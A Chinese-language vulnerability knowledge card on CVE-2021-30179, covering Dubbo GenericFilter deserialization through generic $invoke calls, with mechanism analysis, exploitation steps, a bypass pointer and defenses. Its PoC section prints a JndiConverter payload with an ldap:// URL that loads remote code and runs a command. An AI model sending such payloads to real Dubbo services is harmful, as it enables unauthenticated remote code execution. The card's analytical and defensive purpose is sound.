---
id: web-java-deser-hessian-dubbo-generic-filter-realize-deserialization
title: Dubbo 泛化调用 GenericFilter 反序列化（CVE-2021-30179）：raw.return/bean/native 三种 generic 方式实例化任意类
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: dubbo-generic-filter-realize-deserialization
aliases:
- CVE-2021-30179
- Dubbo GenericFilter 反序列化
- raw.return realize0
- Dubbo 泛化调用 RCE
- JavaBeanDescriptor 反序列化
- dubbo generic native-java
tags:
- java
- dubbo
- deserialization
- rpc
- generic-invocation
- pojo-utils
- javabeandescriptor
- rce
cve:
- CVE-2021-30179
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V622
  verified_at: '2026-11-12T22:07:24+08:00'
  notes: 已对照原文与全部40张图核对：图01/02 DecodeHandler→DecodeableRpcInvocation 依次 readUTF dubboVersion/path/version/methodName/desc；图03/04 isGenericCall 与泛化 desc；图05 desc2classArray；图06-08 HeaderExchangeHandler/ExchangeHandlerAdapter.reply；图09 filter 栈；图10-13 GenericFilter.invoke 与 realize0 的 ClassUtils.forName、newInstance、setter/field 赋值；图14-18 bean 的 JavaBeanSerializeUtil/deserializeInternal/JavaBeanDescriptor(type) ；图19/20 native 的 UnsafeByteArrayInputStream→NativeJavaObjectInput(ObjectInputStream)。PoC 中 args[2] 的 JndiConverter/asText/ldap://0.0.0.0:1389 与图04/10 一致。原文未给出 CVE-2021-30179 版本区间，affected_versions 保持为空；已把触发条件里原文没有的“3.0.x/3.1.x 早期版本”改为“未做类检查”的机制描述。dedup 10候选均 related/new，与 pts-emptyclassarray(0.884)、provider-argument-deserialization(0.883) 入口/触发点不同，非同链。未验证点：未实际发送泛化请求复现。
---

## 一句话结论

Dubbo provider 处理泛化调用时，`GenericFilter` 会按请求附件里的 `generic` 值走 raw.return/bean/native 三种参数还原逻辑：raw.return 的 `PojoUtils.realize0` 会对 Map 中的 `class` 键做 `ClassUtils.forName` + 实例化，并对其余键逐字段调用 setter/反射赋值；bean 走 `JavaBeanSerializeUtil.deserialize`；native 走 `NativeJavaObjectInput` 的 `ObjectInputStream`。攻击者能访问 Dubbo 端口时，可用 `$invoke` 泛化请求把任意可加载类实例化并控制字段，形成预认证 RCE（CVE-2021-30179）。

## 原理

- **泛化调用入口**：Dubbo RPC 请求参数为 `dubboVersion/path/version/methodName/desc` 五个 readUTF，随后按 desc 反序列化参数值。`RpcUtils.isGenericCall(desc, method)` 判定 `$invoke`/`$invokeAsync` 且 desc 为 `Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;` 时进入泛化路径，`ReflectUtils.desc2classArray` 显式加载 desc 中的类。
- **GenericFilter**：`GenericFilter.invoke` 从 `inv.attachments` 取 `generic` 值决定反序列化策略（raw.return、bean、nativejava 等）。
- **raw.return**：对每个参数值调用 `PojoUtils.realize/realize0`。若参数是 Map 且有 `class` 键：`ClassUtils.forName` 用应用类加载器加载类 → `newInstance`（先 public 无参构造，失败则遍历声明构造器取参数最少者）→ 对 Map 其余键：有单参数 setter 就递归实例化参数并调用 setter，否则直接反射写字段。因此攻击者可实例化任意可加载类并控制字段，形成“类加载 → 构造 → setter/field”的利用面。
- **bean**：参数必须是 `JavaBeanDescriptor`；`JavaBeanSerializeUtil.deserialize` → `instantiateForDeserialize` → `name2Class`（`Class.forName`）→ `instantiate`；`deserializeInternal` 按 descriptor 的 `type`（`TYPE_BEAN`）对字段执行 setter 或反射赋值。`JavaBeanDescriptor` 构造时可直接指定 className 与 type。
- **native**：仅当 `dubbo.security.serialize.generic.native-java-enable=true` 时启用；byte[] 参数被包进 `UnsafeByteArrayInputStream`，由 `NativeJavaObjectInput`（内部封装 `ObjectInputStream`）反序列化，等于二次原生反序列化。
- **为什么成立**：泛化调用是 Dubbo 的合法预认证功能，`generic` 策略由客户端在附件中选择；realize/bean 两条路径都允许“按请求内容加载并实例化任意类并写字段”，没有任何类型白名单（后续版本才加入 `SerializeClassChecker`）。

## 触发条件

- 目标 Dubbo provider 暴露 Dubbo 协议端口（默认 20880），且其 GenericFilter 对 raw.return/bean 参数直接实化、未做类检查（原文未给出该 CVE 的具体版本区间；后续版本引入 `SerializeClassChecker` 后此路径被拦）。
- provider 上存在可被泛化调用的服务方法（`$invoke` 能解析到方法）或默认允许泛化。
- classpath 中存在可利用的 gadget（如 xbean-propertyeditor 的 `JndiConverter` 配合 LDAP/JNDI，或 Rome 等 toString/getter 链）。
- raw.return/bean 需要目标能加载对应类；native 模式还需配置开启 `native-java-enable`。

## 利用步骤

1. 确认 Dubbo 端口与目标服务 path/方法；构造 `$invoke` 泛化请求，desc 使用 `Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;`。
2. 选择 generic 策略：
   - `raw.return`：参数 Map 的 `class` 指定任意类，其余键对应字段/setter；
   - `bean`：构造 `JavaBeanDescriptor`（className + type=TYPE_BEAN + 属性键值）；
   - `native`：参数为原生序列化字节（需目标已开启 native-java-enable，见 CVE-2023-23638 开开关手法）。
3. 以 raw.return + JndiConverter 为例：`class=org.apache.xbean.propertyeditor.JndiConverter`、`asText=ldap://<attacker>:1389/Basic/Command/open -a calculator`；realize 时实例化 JndiConverter 并调用 setAsText，触发 JNDI 远程类加载。
4. 启动 LDAP/HTTP 恶意服务托管 Exploit.class，发送请求后 provider 侧执行命令。
5. 若被 `SerializeClassChecker` 拦截，改用 CVE-2023-23638 的绕过路径（native 开开关 / raw.return 改写单例），见关联卡。

## PoC

原文调试中 raw.return 的泛化参数（Hessian2 反序列化后可见）：

```text
args[2] = Map(size=2)
  "class"  -> "org.apache.xbean.propertyeditor.JndiConverter"
  "asText" -> "ldap://0.0.0.0:1389/Basic/Command/open -a calculator"
```

外层请求关键字段：

```text
methodName = "$invoke"
desc       = "Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;"
attachments["generic"] = "raw.return"
args       = [目标方法名, 参数类型数组, 上述 Map]
```

说明：原文为调试分析，未给出可直接发送的完整 Dubbo 报文；实际发送可用 Dubbo consumer 的泛化调用 API 或按 Dubbo 协议手工构造。native 模式示例字节流为 `NativeJavaSerialization` 序列化的任意 gadget，仅在 `dubbo.security.serialize.generic.native-java-enable=true` 时生效。

## 变体与关联

- 变体：`bean` 模式无需 Map 的 `class` 键，直接由 `JavaBeanDescriptor.className` 指定类，并可按 type 控制 setter/字段写；`native` 模式是二次 `ObjectInputStream`，可复用任意原生 gadget。
- 关联：[[web-java-deser-rome-objectbean-jdbcrowset-jndi]]（realize 后常见的 toString/JNDI 链）、[[web-java-deser-hessian-dubbo-generic-filter-serializeclasschecker-bypass]]（CVE-2023-23638 绕过）、[[web-java-deser-hessian-dubbo-provider-argument-deserialization-rce]]（更早的 provider 参数 Hessian2 反序列化入口）。
- 边界：后续版本加入 `SerializeClassChecker`（要求类实现 Serializable、黑名单前缀）后，raw.return/bean 直接加载任意类被拦；native 需配置开启。

## 检测与防御

- 网络：Dubbo 端口不应暴露到不可信网络；配置鉴权、白名单与 TLS。
- 配置：关闭不需要的泛化调用（`generic=false`）或限制可泛化服务；禁用 native-java 泛化序列化（保持 `dubbo.security.serialize.generic.native-java-enable=false`）；升级到修复版本。
- 检测：请求中 methodName 为 `$invoke`/`$invokeAsync` 且 `generic=raw.return/bean/nativejava`；args 中出现 `class` 键、`JavaBeanDescriptor` 或原生序列化魔数；provider 侧类加载异常/日志 “Trigger the safety barrier”。
- 防御：升级 Dubbo 并启用 `dubbo.application.check-serializable=true`；对 GenericFilter 的类加载做白名单；在 RPC 网关层解析并拒绝可疑泛化请求。
